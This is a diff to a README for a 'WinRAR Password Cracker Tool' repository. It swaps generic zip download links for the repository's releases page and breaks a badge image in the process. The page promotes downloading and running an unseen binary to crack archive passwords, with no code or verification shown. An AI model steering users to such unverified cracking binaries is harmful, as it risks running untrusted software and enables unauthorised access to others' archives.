@@ -11,7 +11,7 @@ This powerful tool offers a comprehensive approach to cracking WinRAR passwords,
 🚀 Fast and efficient operation  
 
 ## How to Use
-Simply head over to the [repository's link](https://github.com/files/File.zip) to download the tool. Once downloaded, launch the tool and follow the intuitive instructions provided to start the password cracking process.
+Simply head over to the [repository's link](https://github.com/stmdinogod/WinRAR-Password-Cracker-Tool/releases) to download the tool. Once downloaded, launch the tool and follow the intuitive instructions provided to start the password cracking process.
 
 ## Repository Details
 - **Repository Name:** WinRAR-Password-Cracker-Tool  
@@ -21,7 +21,7 @@ Simply head over to the [repository's link](https://github.com/files/File.zip) t
 ## Get Started
 Don't wait any longer to regain access to your locked WinRAR files. Download the WinRAR Password Cracker Tool now and unlock those important archives hassle-free.
 
-[![Download Tool](https://img.shields.io/badge/Download-Tool-blue)](https://github.com/files/File.zip)
+[![Download Tool](https://github.com/stmdinogod/WinRAR-Password-Cracker-Tool/releases)](https://github.com/stmdinogod/WinRAR-Password-Cracker-Tool/releases)
 
 For more information, suggestions, or contributions, feel free to visit the repository. Thank you for choosing the WinRAR Password Cracker Tool! 🚀🔓
 
